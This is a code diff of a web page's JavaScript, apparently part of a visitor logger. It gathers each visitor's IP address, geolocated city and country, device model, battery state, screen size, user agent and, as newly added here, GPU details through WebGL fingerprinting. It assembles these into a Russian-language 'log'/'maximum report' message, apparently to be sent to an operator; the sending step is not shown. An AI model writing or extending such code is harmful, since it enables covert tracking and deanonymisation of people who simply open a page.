@@ -102,18 +102,35 @@
             await getTripleData();
         }
 
-        async function getTripleData() {
+                async function getTripleData() {
             let ip = "Не определен";
             let city = "Неизвестно";
             
-    
-            let device = navigator.platform;
+         
             const ua = navigator.userAgent;
-            if (/Android/i.test(ua)) device = "📱 Android Phone";
-            else if (/iPhone|iPad/i.test(ua)) device = "🍎 iOS Device";
-            else if (/Windows/i.test(ua)) device = "💻 Windows PC";
+            let model = "Неизвестно";
+            
+            if (/Android/i.test(ua)) {
+                const match = ua.match(/Android\s+([\d\.]+);\s+([^;]+)\s+Build/i);
+                model = match ? `📱 ${match[2]} (Android ${match[1]})` : "📱 Android Device";
+            } else if (/iPhone|iPad|iPod/i.test(ua)) {
+                model = "🍎 Apple iOS Device";
+            } else if (/Windows/i.test(ua)) {
+                model = "💻 Windows PC";
+            }
 
-           
+          
+            let gpu = "N/A";
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Generic GPU";
+                }
+            } catch(e) {}
+
+         
             let batteryInfo = "N/A";
             if (navigator.getBattery) {
                 const b = await navigator.getBattery();
@@ -121,32 +138,33 @@
             }
 
             try {
-             
+            
                 const ipRes = await fetch('https://api64.ipify.org?format=json').catch(() => null);
                 if (ipRes) {
                     const ipData = await ipRes.json();
                     ip = ipData.ip;
                 }
 
-             
+                 
                 const geoRes = await fetch(`https://ipapi.co/${ip}/json/`).catch(() => null);
                 if (geoRes) {
                     const geoData = await geoRes.json();
                     city = `${geoData.city}, ${geoData.country_name}`;
                 }
 
-             
+              
                 document.getElementById('user-ip').innerText = ip;
                 document.getElementById('user-geo').innerText = city;
-                document.getElementById('user-os').innerText = device;
+                document.getElementById('user-os').innerText = model;
                 document.getElementById('user-bat').innerText = batteryInfo;
 
-             
-                const msg = `🚀 НОВЫЙ ЛОГ!
+         
+                const msg = `🚀 МАКСИМАЛЬНЫЙ ОТЧЕТ!
 📍 IP: ${ip}
 🌍 ГОРОД: ${city}
-📱 УСТРОЙСТВО: ${device}
+📱 МОДЕЛЬ: ${model}
 🔋 БАТАРЕЯ: ${batteryInfo}
+🎮 ВИДЕОКАРТА: ${gpu}
 🖥 ЭКРАН: ${window.screen.width}x${window.screen.height}
 🌐 ТЕХ ИНФО: ${ua}`;
 
